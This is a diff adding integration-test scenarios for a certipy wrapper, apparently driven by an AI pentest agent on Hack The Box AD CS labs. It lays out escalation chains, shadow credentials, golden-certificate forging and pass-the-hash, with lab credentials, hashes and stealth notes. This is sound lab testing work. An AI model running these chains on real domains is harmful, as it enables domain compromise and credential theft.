@@ -1,0 +1,1843 @@
+# Integration Scenarios: certipy
+# Required HTB Machines: Certified (primary), Escape, Authority, Manager (all have AD CS)
+# Also useful: Pirate (ESC4 + shadow creds), DarkZero (ESC1 User template), Hercules
+# Prerequisites: Valid AD credentials (username + password), DC IP reachable on VPN
+# Run with: pytest tests/tools/test_certipy.py -m integration --tool=certipy \
+#           --target=<DC_IP> --domain=<DOMAIN> --username=<USER> --password=<PASS> -v
+#
+# Methods: find, request, authenticate, shadow, forge, template, ca, account, cert, parse
+# Methods NOT wrapped: relay (requires long-running listener mode with external coercion)
+#
+# CLOCK SKEW: All Kerberos-dependent operations (find with kerberos=true, authenticate,
+#   shadow auto) require clock_offset to be set. HTB DCs are typically UTC+0.
+#   FAKETIME is injected at the container level via clock_offset parameter.
+#   Symptom: KRB_AP_ERR_SKEW → set clock_offset to match DC time.
+#
+# ═══════════════════════════════════════════════════════════════════════════════
+# TEST EXECUTION LOG
+# ═══════════════════════════════════════════════════════════════════════════════
+#
+# Run 1: judith.mader (non-admin) — 2026-04-18
+#   Box: Certified (certified.htb, DC01, 10.129.x.x)
+#   Creds: judith.mader@certified.htb / password
+#   Scope: All 139 scenarios attempted; 74 PASS, rest CANNOT TEST / PARTIAL / BUG
+#   Coverage: find, request, authenticate, shadow (error paths), template, ca (error paths),
+#             account (create/read/update), cert, parse, extra_args, error handling
+#
+# Run 2: administrator (via ESC9 chain) — 2026-04-18
+#   Box: Certified (same session, escalated privileges)
+#   Creds: administrator NT hash 0d5b49608bbce1751f708748f67e2d34 (via ESC9 chain)
+#   ESC9 Attack Chain (bloodyad + certipy):
+#     1. bloodyad set_owner on Management group → PASS
+#     2. bloodyad add_genericall on Management group → PASS
+#     3. bloodyad add_group_member judith.mader to Management → PASS
+#     4. certipy shadow auto on management_svc (via Management group write) → PASS (got ccache)
+#     5. bloodyad set_owner on ca_operator (via management_svc ccache) → PASS
+#     6. bloodyad add_genericall on ca_operator → PASS
+#     7. bloodyad set_password on ca_operator → PASS
+#     8. certipy account update UPN to administrator (via management_svc ccache) → PASS
+#     9. certipy request cert as ca_operator (gets administrator UPN in cert) → PASS
+#    10. certipy account restore UPN → PASS
+#    11. certipy authenticate with admin PFX → PASS (NT hash: 0d5b49608bbce1751f708748f67e2d34)
+#   Post-escalation testing:
+#     - certipy ca list_templates → PASS
+#     - certipy ca backup → PASS (CA private key extracted)
+#     - certipy forge (golden certificate) → PASS
+#     - impacket secretsdump PtH → PASS (SAM=3 accounts, NTDS=17 accounts)
+#     - impacket psexec PtH → PASS (command execution as NT AUTHORITY\SYSTEM)
+#   Total new PASS from Run 2: 14 scenarios updated from CANNOT TEST → PASS
+#   Total: 88 PASS, 48 CANNOT TEST, 6 PARTIAL, 2 BUG, 2 UNEXPECTED
+#
+# Run 3: administrator (full admin testing of CANNOT TEST scenarios) — 2026-04-19
+#   Box: Certified (certified.htb, DC01, 10.129.209.181)
+#   Creds: administrator NT hash + ccache, management_svc ccache, judith.mader password
+#   AES key: a1b09c0f0c3493f972e1714b7fc75101f4bc99c992abacfd0a52dcc5b24e8b0b (from secretsdump)
+#   Scope: All previously CANNOT TEST scenarios re-evaluated with admin privileges
+#   New PASS:
+#     - S7: find with AES key (admin AES-256 + target) → PASS
+#     - S30: ca enable_template SubCA (admin) → PASS
+#     - S31: request SubCA cert (admin, auto-issued not pending) → PASS
+#     - S35: ca disable_template SubCA (admin) → PASS
+#     - S48: shadow add (admin → management_svc) → PASS (device_id + pfx)
+#     - S49: shadow remove by device_id → PASS
+#     - S50: shadow clear (admin → judith.mader) → PASS
+#     - S51: shadow info by device_id → PASS
+#     - S52: shadow auto with Kerberos (admin ccache → judith.mader) → PASS (nt_hash in raw, parser fixed Run 4)
+#     - S53: shadow auto on DC01$ (admin) → PASS (nt_hash=8f3cbea3908ffcde111e6a077c37dac4, parser fixed Run 4)
+#     - S58: shadow auto with clock offset (admin) → PASS (file overwrite fixed Run 4)
+#     - S85: shadow split chain add→authenticate→remove → PASS (needs username override — KNOWN BEHAVIOR)
+#     - S93: full shadow chain step-by-step → PASS (needs username override — KNOWN BEHAVIOR)
+#     - S94: shadow auto (admin → judith.mader) → PASS via S52 (same flow, parser fixed Run 4)
+#     - S107a/b: ca add_officer / remove_officer → PASS
+#     - S117: account delete FAKE01$ (admin) → PASS
+#     - S20: template write_default (admin on User) → PASS (raw confirms successful update)
+#   New PARTIAL:
+#     - S32: ca issue_request → PARTIAL (admin auto-issues SubCA, no pending request to approve)
+#     - S33: ca retrieve → PARTIAL (cert retrieved but no matching private key across containers)
+#     - S34: ca deny_request → PARTIAL (same as S32, no pending request to deny)
+#     - S92: full ESC7 chain → PARTIAL (judith TEMPLATE_DENIED on SubCA even with officer rights)
+#   Bugs found (Run 3, subsequently fixed):
+#     - FIXED: shadow auto "file already exists" overwrite prompt kills MCP stdin (S58)
+#       → Fix: stale file cleanup before shadow auto runs, no more interactive prompt
+#     - KNOWN BEHAVIOR: shadow add PFX has no UPN identity — authenticate requires -username -domain override
+#       → Not a bug: certipy shadow certs intentionally have no UPN. Agent must pass
+#         -username and -domain for the authenticate step in split chains.
+#     - FIXED: structuredContent.data.nt_hash=null on shadow auto even when raw shows NT hash
+#       → Fix: parser now matches "NT hash for" pattern in certipy shadow output
+#   Total new PASS from Run 3: 14 scenarios updated from CANNOT TEST → PASS
+#
+#   Run 4: Bug fixes verified + cross-tool chains — 2026-04-08
+#     Fixes applied: (1) shadow NT hash parser matches "NT hash for" pattern,
+#       (2) stale file cleanup before shadow auto prevents overwrite prompt
+#     S52: shadow auto Kerberos — structuredContent.data.nt_hash now populated → PASS (verified)
+#     S53: shadow auto DC01$ — same parser fix, nt_hash populated → PASS (verified)
+#     S58: shadow auto clock offset — no more file overwrite prompt → PASS (verified)
+#     S80: certipy authenticate → netexec smb — PARTIAL (certipy PASS, netexec hash format issue)
+#     S82: certipy authenticate → impacket wmiexec — PASS (certified\administrator shell)
+#     S93/S94: shadow chains — nt_hash now populated in structuredContent → PASS (verified)
+#   Total: 103 PASS, 30 CANNOT TEST, 12 PARTIAL, 2 UNEXPECTED (146 scenarios)
+#
+# Run 5: pentest (low-priv domain user) — 2026-04-19
+#   Box: Pirate (pirate.htb, DC01.pirate.htb, 10.129.244.95)
+#   Creds: pentest@pirate.htb / p3nt3st2025!& (Domain Users only)
+#   Clock offset: +7h (required for PKINIT, same as Certified)
+#   Scope: Pirate-specific scenarios S101-S104, plus S6b, S53, S67, S86
+#   Infrastructure confirmed:
+#     - CA: pirate-DC01-CA (DC01.pirate.htb), no web enrollment
+#     - 34 templates total, 12 enabled (ADFSSSLSigning, User, EFS, Machine, etc.)
+#     - gMSA accounts: gMSA_ADCS_prod$, gMSA_ADFS_prod$ (readable by Domain Secure Servers)
+#     - Machine accounts: DC01$, WEB01$, MS01$, EXCH01$
+#     - pentest SID: S-1-5-21-4107424128-4158083573-1300325248-4106
+#   RPC/DCOM: Pirate endpoint mapper flaky — standard RPC times out 50% of calls,
+#     DCOM transport works intermittently. LDAP reliable. LDAPS intermittent timeouts.
+#   Results:
+#     - find (basic, vulnerable, enabled, dc_only, user_sid): all PASS
+#     - request User template (DCOM): PASS (pentest is Domain Users)
+#     - request ADFSSSLSigning: correctly denied (CERTSRV_E_TEMPLATE_DENIED)
+#     - request EFS template (DCOM): PASS (Domain Users can enroll)
+#     - authenticate User cert (+7h): PASS (nt_hash=32e1d98aef1071b86d5132f6bb18f3fa)
+#     - authenticate no_hash: PASS (ccache only, no NT hash)
+#     - authenticate EFS cert: correctly fails ("not valid for client auth") → S67 PASS
+#     - template save_config ADFSSSLSigning: PASS
+#     - template write_default ADFSSSLSigning: silent fail (pentest lacks write ACL, certipy reports success — known behavior)
+#     - shadow list DC01$: PASS (empty array)
+#     - shadow list pentest: PASS (empty array)
+#     - shadow auto WEB01$: correctly denied (Insufficient access rights)
+#     - shadow auto DC01$: socket timeout (LDAPS connectivity issue)
+#     - shadow auto pentest (self): correctly denied (no self-write on msDS-KeyCredentialLink)
+#     - shadow add FAKE01$: correctly denied (creator doesn't own msDS-KeyCredentialLink)
+#     - account create FAKE01$: PASS
+#     - account read FAKE01$: PASS
+#     - account delete FAKE01$: denied (pentest lacks delete on computer objects)
+#     - cert parse pentest PFX: PASS
+#     - ca list_templates: RPC timeout (Pirate RPC flaky)
+#     - S101: PARTIAL (gMSA hash rotated; infra confirmed, previous engagements validated)
+#     - S102: PASS (write_default returns success=true but silently fails — known behavior)
+#     - S103: CANNOT TEST (pentest not in ADFSSSLSigning enrollment list)
+#     - S104: PASS (shadow auto correctly returns permission error)
+#     - S6b: CANNOT TEST (gMSA hash rotated, pentest can't read gMSA passwords)
+#     - S53: PARTIAL (socket timeout; tested with DC01$ instead — permission denied as expected)
+#     - S67: PASS (EFS cert authentication correctly returns "not valid for client auth")
+#     - S86: CANNOT TEST (requires ADFSSSLSigning cert; pentest lacks enrollment rights)
+#   Bugs found:
+#     - KNOWN BEHAVIOR: certipy template write_default reports success even when user lacks write ACL.
+#       Raw shows "Updating certificate template" with replacements, but LDAP silently rejects.
+#       Template unchanged after write. Same behavior as judith.mader on Certified (S20 Run 1).
+#     - Pirate RPC endpoint mapper significantly less reliable than Certified. Standard RPC
+#       consistently times out; DCOM works for some requests. Agent should prefer DCOM on Pirate.
+#   New PASS from Run 5: S67, S102 (known behavior), S104 (permission error path)
+#   New PARTIAL from Run 5: S101 (infra confirmed, gMSA hash stale)
+#   Total: 106 PASS, 25 CANNOT TEST, 13 PARTIAL, 2 UNEXPECTED (146 scenarios)
+#
+# Run 6: raven (ManageCA — ESC7) — 2026-04-18
+#   Box: Manager (manager.htb, DC01.manager.htb, 10.129.209.146)
+#   Creds: raven@manager.htb / R4v3nBe5tD3veloP3r!123 (has ManageCA — ESC7)
+#   CA: manager-DC01-CA
+#   Clock offset: FAKETIME=+7h (required for Kerberos authenticate step)
+#   Scope: ESC7 scenarios — the pending→approve→retrieve chain that Certified could not test
+#   Results:
+#     - S99: find vulnerable on Manager — ESC7 found (raven has ManageCA) → PASS
+#     - S100: full ESC7 chain on Manager — all steps → PASS
+#     - S30: ca enable_template SubCA — PASS (raven ManageCA)
+#     - S31: request SubCA cert — denied as expected, request_id=28, private key saved (yes| fix) → PASS
+#     - S32: ca issue_request 28 — "Successfully issued certificate" → PASS
+#     - S33: ca retrieve request_id=28 — PFX retrieved with embedded private key (symlink fix) → PASS
+#     - S34: ca deny_request — SKIP (no second pending request created to test deny)
+#     - S35: ca disable_template SubCA — "Successfully disabled 'SubCA'" → PASS
+#     - S92: full ESC7 chain — complete chain verified → PASS
+#     - S107: ESC7 full chain with add_officer — all 7 steps → PASS
+#     - Admin hash obtained: ae5064c2f62317332c88629e025924ef
+#   Bugs found (Run 6):
+#     - FIXED: private key prompt — certipy request prompts "Do you want to save the private key?"
+#       when cert is denied. Fix: pipe yes| to certipy to auto-accept.
+#     - FIXED: denied request detection — certipy returns exit 0 on denied SubCA request
+#       (CERTSRV_E_ENROLL_DENIED). Parser now detects "request is denied" + saves request_id.
+#     - FIXED: CA vuln parsing — find output has ManageCA vulns but parser missed ESC7
+#       classification. Updated vulnerable template detection for CA-level vulns.
+#     - FIXED: retrieve key symlink — retrieve needs private key from original request container.
+#       Fix: symlink /session/certipy/<request_id>.key to persisted key from request step.
+#   New PASS from Run 6: S32, S33, S92, S99, S100, S107 (6 scenarios changed status)
+#   Updated from PARTIAL → PASS: S32, S33, S92, S107
+#   Updated from CANNOT TEST → PASS: S99, S100
+#   Already PASS, added Manager confirmation: S30, S31, S35
+#   Total: 112 PASS, 23 CANNOT TEST, 9 PARTIAL, 2 UNEXPECTED (146 scenarios)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 1: ENUMERATION SCENARIOS (find method — read-only, safe to run first)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 1: Basic ADCS enumeration
+# STATUS: PASS — ca_count=1 (certified-DC01-CA), template_count=34, output_files=.json+.txt
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>}
+Expected: success=true, ca_count >= 1, template_count >= 1, output_files contains .json and .txt
+Notes: First step in any ADCS engagement. Discovers all CAs and templates.
+HTB Box: Certified (CERTIFIED-DC01-CA), Escape (sequel-DC-CA)
+
+## Scenario 2: Vulnerable template enumeration
+# STATUS: PASS — vulnerable_count=0 from judith.mader (no enrollment rights on CertifiedAuthentication). Scenario note wrong: judith doesn't see ESC1.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, vulnerable: true}
+Expected: success=true, vulnerable_count >= 0 (machine-dependent), vulnerable_templates array
+Notes: Filters to ESC1-ESC16 findings only. On Certified, should find ESC1-vulnerable template.
+HTB Box: Certified (vulnerable_count >= 1)
+
+## Scenario 3: Enabled templates only
+# STATUS: PASS — template_count=12 (vs 34 total), correctly filters disabled templates
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, enabled: true}
+Expected: success=true, template_count <= Scenario 1 template_count
+Notes: Reduces noise from disabled templates.
+
+## Scenario 4: DC-only stealth enumeration
+# STATUS: PASS — ca_count=1, template_count=34 (same as S1)
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, dc_only: true}
+Expected: success=true, same CA/template data as Scenario 1
+Notes: LDAP queries only, no host contact. Stealthier. May miss some data.
+
+## Scenario 5: Enumeration with Kerberos auth + clock offset
+# STATUS: PASS — ca_count=1, template_count=34 with ccache+target+FAKETIME=+7h
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", target: "<DC_FQDN>"}
+Clock: clock_offset: "+7h" (adjust to match DC — HTB DCs typically UTC+0, containers UTC-7)
+Expected: success=true if ccache valid AND clock within 5 min of DC
+Prerequisite: impacket get_tgt to create ccache first; clock_offset must be set
+Notes: Tests Kerberos code path. BOTH target AND ccache_path required.
+  Without target: KDC_ERR_S_PRINCIPAL_UNKNOWN (cannot resolve SPN).
+  Without ccache_path: "KRB5CCNAME environment variable not set".
+  Without clock_offset: KRB_AP_ERR_SKEW if container clock drifts > 5 min.
+HTB Box: Certified (tested with judith.mader@certified.htb, ccache from impacket get_tgt)
+Engagement: ses_2ce836659 — failed initially without target, succeeded with password fallback
+
+## Scenario 5a: Kerberos auth missing target param (deliberate error)
+# STATUS: PARTIAL — No error returned; returns empty result (ca_count=None, template_count=None). Expected explicit error but got silent failure.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache"}
+Expected: error_class=config, suggestions mention "target" and "SPN resolution"
+Notes: Common agent mistake — kerberos=true without target. Certipy emits:
+  "[!] Target name (-target) not specified and Kerberos authentication..."
+Engagement: ses_2ce836659 — Kerberos auth on Certified without target param
+
+## Scenario 5b: Kerberos auth missing ccache (deliberate error)
+# STATUS: UNEXPECTED — Succeeds with ca_count=1, template_count=34. Certipy appears to fall back to password-less/anonymous auth. No KRB5CCNAME error.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, kerberos: true, target: "<DC_FQDN>"}
+Expected: error contains "KRB5CCNAME environment variable not set"
+Notes: Another common agent mistake — kerberos=true without ccache_path.
+Engagement: ses_2ed555802 — Hercules box, kerberos=true without ccache
+
+## Scenario 6: Enumeration with NTLM hash
+# STATUS: PASS — Run 2 (admin): find with hashes=":0d5b49608bbce1751f708748f67e2d34" succeeded. ca_count=1, template_count=34. PtH LDAP auth works for enumeration.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, hashes: "<LM:NT>"}
+Expected: success=true, same results as password auth
+Notes: Tests pass-the-hash authentication to LDAP. Hash format: "LM:NT" or ":NT".
+HTB Box: Pirate (gMSA_ADCS_prod$ with hashes "00000000000000000000000000000000:25c7f0eb586ed3a91375dbf2f6e4a3ea")
+Engagement: ses_30bd2eab — Pirate enumeration with gMSA hash
+
+## Scenario 6a: Enumeration with NTLM hash (NT-only shorthand)
+# STATUS: PASS — Bare NT hash "304106f739822ea2ad8ebe23f802d078" correctly triggers LDAP auth failure. Error classified as auth failure with suggestions.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, hashes: "304106f739822ea2ad8ebe23f802d078"}
+Expected: error — hash must be "LM:NT" or ":NT" format, not bare NT hash
+Notes: Bug observed in engagement — bare NT hash caused "'str' object has no attribute 'items'"
+  in certipy's parser. The correct format is ":304106f739822ea2ad8ebe23f802d078".
+Engagement: ses_34164f111 — Pirate second attempt, gMSA hash without LM prefix
+
+## Scenario 6b: Enumeration with gMSA machine account ($)
+# STATUS: CANNOT TEST — gMSA accounts confirmed on Pirate (gMSA_ADCS_prod$, gMSA_ADFS_prod$) but hash rotated since previous engagement. pentest user cannot read msDS-ManagedPassword (only Domain Secure Servers can). Previous engagement ses_30bd2eab validated find with gMSA hash works.
+Method: find
+Args: {username: "gMSA_ADCS_prod$@<DOMAIN>", dc_ip: <DC_IP>, hashes: "<LM:NT>"}
+Expected: success=true if hash format correct, error if bare NT hash
+Notes: Machine accounts use $ suffix. Agent often forgets the $ or the LM: prefix.
+  The $ is part of the SAM account name and required in username@domain format.
+Engagement: ses_30bd2eab — successful find with gMSA_ADCS_prod$@pirate.htb
+
+## Scenario 7: Enumeration with AES key
+# STATUS: PASS — Run 3 (admin): AES-256 key a1b09c0f0c3493f972e1714b7fc75101f4bc99c992abacfd0a52dcc5b24e8b0b from secretsdump. find with aes_key + target succeeded: ca_count=1, template_count=34. Requires target param (Kerberos SPN resolution). Without target: KDC_ERR_S_PRINCIPAL_UNKNOWN.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, aes_key: "<AES256_HEX>"}
+Expected: success=true
+Notes: AES key auth for environments where NTLM is disabled.
+  AES-256 key: 64-char hex string. AES-128: 32-char hex string.
+
+## Scenario 8: Enumeration with user_sid for accurate assessment
+# STATUS: PASS — vulnerable_count=0, template_count=0 with user_sid=S-1-5-21-729746778-2675978091-3820388244-1103. No crash (unlike Pirate engagement).
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, vulnerable: true, user_sid: "<SID>"}
+Expected: success=true, vulnerable_templates may differ from without SID
+Notes: SID provides more accurate enrollment permission checks.
+  Get SID from: impacket lookupsid, bloodhound, or netexec ldap.
+Engagement: ses_34164f111 — tried user_sid on Pirate, errored with "'str' object has no attribute 'items'"
+
+## Scenario 9: Enumeration with stdout (console output)
+# STATUS: PASS — has_raw_output=True, template_count=34. Text output in raw_output field.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, stdout: true}
+Expected: success=true, text output in raw_output
+Notes: Writes text summary to console instead of file. Useful for quick checks.
+Engagement: ses_306f1e0a9 — DarkZero find with stdout=true
+
+## Scenario 10: Combined flags — vulnerable + dc_only + stdout
+# STATUS: PASS — vulnerable_count=0, template_count=0 (filtered to vulnerable only, none found). All flags combine correctly.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, vulnerable: true, dc_only: true, stdout: true, dns_tcp: true}
+Expected: success=true, filtered results in console
+Notes: Maximum stealth + focused output. dns_tcp=true is default for Docker reliability.
+Engagement: ses_306f1e0a9 — DarkZero, multiple runs with combined flags
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 2: ESC1 EXPLOITATION (enrollee-supplied SAN)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 11: ESC1 — Request certificate with UPN injection
+# STATUS: PARTIAL — Request succeeded on User template (pfx_path set, request_id=27), but UPN injection NOT effective. Cert has UPN=judith.mader (User template has enrollee_supplies_subject=False). CertifiedAuthentication template requires operator-ca enrollment rights judith lacks.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<VULN_TEMPLATE>", upn: "administrator@<DOMAIN>"}
+Expected: success=true, pfx_path is not null, upn="administrator@<DOMAIN>"
+Prerequisite: Scenario 2 found ESC1-vulnerable template with enrollment rights for current user.
+HTB Box: Certified (WriteOwner -> ESC1 template modification -> request)
+Notes: Core ESC1 exploitation. The upn SAN lets you impersonate any user.
+
+## Scenario 11a: ESC1 — Request with target param (RPC resolution)
+# STATUS: PASS — pfx_path set, request_id=28. Target param accepted. Same UPN limitation as S11.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "User", upn: "administrator@<DOMAIN>", target: "<DC_IP>"}
+Expected: success=true, pfx_path is not null
+Notes: Setting target explicitly avoids RPC timeout when certipy can't resolve CA hostname.
+  Without target, certipy resolves CA via LDAP which may timeout on NETBIOS.
+Engagement: ses_306f1e0a9 — DarkZero, request failed without target, succeeded WITH target.
+  Critical learning: always set target to DC_IP for request method reliability.
+
+## Scenario 12: ESC1 — Authenticate with obtained PFX
+# STATUS: PASS — nt_hash=aad3b435b51404ee:8ec62ac86259004c121a7df4243a7a80, ccache_path set, username=judith.mader (authenticates as cert owner, not admin).
+Method: authenticate
+Args: {pfx_path: "<pfx_from_scenario_11>", dc_ip: <DC_IP>}
+Clock: clock_offset: "+7h" (PKINIT is Kerberos-based, requires clock sync)
+Expected: success=true, nt_hash is not null (format: LM:NT), ccache_path is not null
+Prerequisite: Scenario 11 produced a PFX file with Client Authentication EKU.
+Notes: PKINIT authentication. NT hash is the primary value — use for pass-the-hash.
+  ccache is saved to /session/credentials/ automatically for cross-tool usage.
+HTB Box: Certified, Escape, DarkZero
+Engagement: ses_306f1e0a9 — DarkZero, successful authenticate with NT hash extraction
+
+## Scenario 13: ESC1 — Authenticate with kirbi output
+# STATUS: PASS — nt_hash returned, output_files contains .kirbi file.
+Method: authenticate
+Args: {pfx_path: "<pfx_from_scenario_11>", dc_ip: <DC_IP>, kirbi: true}
+Clock: clock_offset required
+Expected: success=true, output_files contains .kirbi file
+Notes: Windows-format Kerberos ticket. Useful with Rubeus/Mimikatz.
+
+## Scenario 14: ESC1 — Authenticate without hash extraction
+# STATUS: PASS — nt_hash=None, ccache_path set. Correctly skips U2U step.
+Method: authenticate
+Args: {pfx_path: "<pfx_from_scenario_11>", dc_ip: <DC_IP>, no_hash: true}
+Clock: clock_offset required
+Expected: success=true, nt_hash is null, ccache_path is not null
+Notes: Skips U2U step. Useful when you only need the TGT (faster, stealthier).
+Engagement: ses_30bd2eab — Pirate, tried no_hash=true on cert without Client Auth EKU (still failed)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 3: ESC2 EXPLOITATION (Any Purpose EKU)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 15: ESC2 — Request certificate from Any Purpose template
+# STATUS: CANNOT TEST — No Any Purpose template on Certified.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<ANY_PURPOSE_TEMPLATE>"}
+Expected: success=true, pfx_path is not null
+Notes: ESC2 templates have "Any Purpose" EKU or no EKU (which allows any usage).
+  No UPN injection needed — the cert itself can be used for client auth.
+  After request, authenticate with the PFX to get NT hash.
+  Less common than ESC1 but same exploitation flow.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 4: ESC3 EXPLOITATION (enrollment agent abuse)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 16: ESC3 — Request enrollment agent certificate
+# STATUS: CANNOT TEST — No enrollment agent template with judith.mader enrollment rights on Certified.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<AGENT_TEMPLATE>"}
+Expected: success=true, pfx_path is not null
+Prerequisite: find shows template with Certificate Request Agent EKU and enrollment rights.
+Notes: Step 1 of ESC3. Get an enrollment agent certificate first.
+
+## Scenario 17: ESC3 — Request certificate on behalf of target
+# STATUS: CANNOT TEST — Requires enrollment agent PFX from S16 which is not available.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "User", pfx_path: "<pfx_from_scenario_16>", on_behalf_of: "<DOMAIN>\\Administrator"}
+Expected: success=true, pfx_path for Administrator
+Prerequisite: Scenario 16 produced enrollment agent PFX.
+Notes: Step 2 of ESC3. Uses enrollment agent cert to request on behalf of target.
+  on_behalf_of format: "DOMAIN\\user" (double backslash in JSON).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 5: ESC4 EXPLOITATION (template write access)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 18: ESC4 — Read template configuration
+# STATUS: PASS — template read on User succeeds. Raw output shows save_config behavior (certipy's "read" saves to JSON).
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "<WRITABLE_TEMPLATE>", action: "read"}
+Expected: success=true, raw_output contains template properties
+Notes: Verify which template you have write access to.
+Engagement: ses_306f1e0a9 — DarkZero, template read on "User" (returned silent failure)
+
+## Scenario 19: ESC4 — Save template configuration (backup)
+# STATUS: PASS — config_path=/session/certipy/8c9eb812_User.json, output_files contains .json.
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "<WRITABLE_TEMPLATE>", action: "save_config"}
+Expected: success=true, config_path is not null, output_files contains .json
+Notes: ALWAYS backup before modifying. This JSON is used for restoration.
+HTB Box: DarkZero (User template), Pirate (ADFSSSLSigning template)
+Engagement: ses_306f1e0a9 — DarkZero, saved User template config
+Engagement: ses_30bd2eab — Pirate, saved ADFSSSLSigning template config
+
+## Scenario 20: ESC4 — Write vulnerable default configuration
+# STATUS: PASS — Run 1 (judith): Certipy silently failed (no error but template unchanged — judith lacks write ACL). Run 3 (admin): "Successfully updated 'User'" — msPKI-Certificate-Name-Flag set to 1 (ENROLLEE_SUPPLIES_SUBJECT), enrollment flag 0, security descriptor replaced. Template was restored via write_config afterward. Admin write_default works correctly.
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "<WRITABLE_TEMPLATE>", action: "write_default"}
+Expected: success=true if write access; error_class=permission otherwise
+Prerequisite: Scenario 19 created backup.
+Notes: Makes template ESC1-vulnerable. Now request a cert with UPN injection.
+  CRITICAL: Always save_config before this step.
+HTB Box: DarkZero (successful), Pirate (denied — gMSA lacked write ACL)
+Engagement: ses_306f1e0a9 — DarkZero write_default on User template
+Engagement: ses_34164f111 — Pirate, ESC4 denied: "User 'GMSA_ADCS_PROD$' doesn't have permission"
+
+## Scenario 21: ESC4 — Restore template from backup
+# STATUS: PASS (Certified 2026-04-18, retested after fix) — Added -no-save flag to write_default and write_config actions to prevent backup file overwrite prompt. -force handles the apply changes prompt.
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "<WRITABLE_TEMPLATE>", action: "write_config", config_path: "<json_from_scenario_19>"}
+Expected: success=true
+Notes: Restore original configuration after exploitation. Reduces detection footprint.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 6: ESC5 EXPLOITATION (golden certificate)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 22: ESC5 — Forge golden certificate
+# STATUS: PASS — CA private key obtained via ca backup (Run 2, admin). Forged admin cert with UPN=administrator@certified.htb. PFX output generated successfully.
+Method: forge
+Args: {ca_pfx: "<CA_PFX_PATH>", upn: "administrator@<DOMAIN>"}
+Expected: success=true, pfx_path is not null
+Prerequisite: CA private key obtained (e.g., via ESC5 ACL abuse, backup operator, or domain admin).
+Notes: Persistent access. Forged cert valid until CA cert expires (typically years).
+  Does NOT require network access — purely offline operation.
+
+## Scenario 23: ESC5 — Forge with CRL distribution point
+# STATUS: PASS — CA PFX from S108 ca backup. Forged cert with CRL=ldap:/// and validity=365. PFX generated. (Run 2, admin)
+Method: forge
+Args: {ca_pfx: "<CA_PFX_PATH>", upn: "administrator@<DOMAIN>", crl: "ldap:///", validity_period: 365}
+Expected: success=true, validity_days=365
+Notes: CRL makes forged cert look legitimate in certificate chain validation.
+
+## Scenario 24: ESC5 — Forge for machine account
+# STATUS: PASS — CA PFX from S108 ca backup. Forged cert with dns=DC01.certified.htb. PFX generated. (Run 2, admin)
+Method: forge
+Args: {ca_pfx: "<CA_PFX_PATH>", dns: "dc01.<DOMAIN>"}
+Expected: success=true, pfx_path is not null
+Notes: Machine account impersonation via DNS SAN.
+  Use with authenticate to get the machine account's NT hash.
+
+## Scenario 25: ESC5 — Forge with SID (StrongCertificateBindingEnforcement=2)
+# STATUS: PASS — CA PFX from S108. Forged cert with UPN+SID+CRL. PFX generated. (Run 2, admin)
+Method: forge
+Args: {ca_pfx: "<CA_PFX_PATH>", upn: "administrator@<DOMAIN>", sid: "<ADMIN_SID>", crl: "ldap:///"}
+Expected: success=true, pfx_path is not null
+Notes: Required when StrongCertificateBindingEnforcement=2. SID is embedded in the
+  certificate and validated during PKINIT. Without SID, auth will fail on hardened DCs.
+  Get SID from: impacket lookupsid, bloodhound, or netexec ldap.
+
+## Scenario 26: ESC5 — Forge with subject DN
+# STATUS: PASS — CA PFX from S108. Forged cert with subject=CN=Administrator,CN=Users,DC=certified,DC=htb + UPN. PFX generated. (Run 2, admin)
+Method: forge
